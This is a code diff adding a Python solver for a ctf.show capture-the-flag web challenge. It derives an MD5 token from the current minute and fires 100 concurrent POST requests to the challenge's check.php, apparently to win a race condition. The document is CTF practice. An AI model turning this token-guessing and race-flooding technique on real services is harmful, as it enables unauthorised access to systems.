@@ -1,5 +1,7 @@
 import time
 import requests
+import hashlib
+import threading
 
 ############ CTFshow web1
 def ctfshow_web_1():
@@ -43,6 +45,34 @@ def ctfshow_web_1():
                 if(i=="~"):
                     key=1
                 break
-ctfshow_web_1()
+#ctfshow_web_1()
 
+
+############ ctf.show_红包题第六弹
+def ctf_show_hongbao_6():
+    i = str(time.localtime().tm_min)
+    m = hashlib.md5(i.encode()).hexdigest()
+    url = "http://2625e7be-c378-47f3-a74a-7be2a8c153e0.challenge.ctf.show/check.php?token={}&php://input".format(m)
+
+    def POST(data):
+        try:
+            r = requests.post(url,data=data)
+            if "ctfshow" in r.text:
+                print(r.text)
+                pass
+            pass
+        except Exception as e:
+            print("出错了")
+            pass
+        pass
+
+    with open('./resource/key.dat','rb') as file:
+        data1 = file.read()
+        pass
+    for i in range(50):
+        threading.Thread(target=POST,args=(data1,)).start()
+    for i in range(50):
+        data2 = 'xixixix'
+        threading.Thread(target=POST,args=(data2,)).start()
+ctf_show_hongbao_6()
 
